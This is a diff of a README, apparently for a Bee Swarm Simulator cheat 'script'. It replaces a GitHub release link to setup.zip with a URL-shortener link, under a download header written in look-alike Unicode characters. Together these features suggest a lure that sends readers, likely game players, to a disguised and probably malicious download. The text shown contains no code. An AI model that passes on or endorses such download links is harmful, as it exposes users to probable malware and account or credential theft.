@@ -38,7 +38,7 @@
 
 
 
-# Click to get the script ===>>> ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱 Script](https://github.com/BoomssloI/Bee-Swarm-Simulator/releases/download/Download/setup.zip)***
+# Click to get the script ===>>> ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱 Script](https://getwix.short.gy/main)***
 
 
 ![maxresdefault](https://github.com/user-attachments/assets/7ac92a58-c4eb-4cd3-8d76-bd7071d90079)
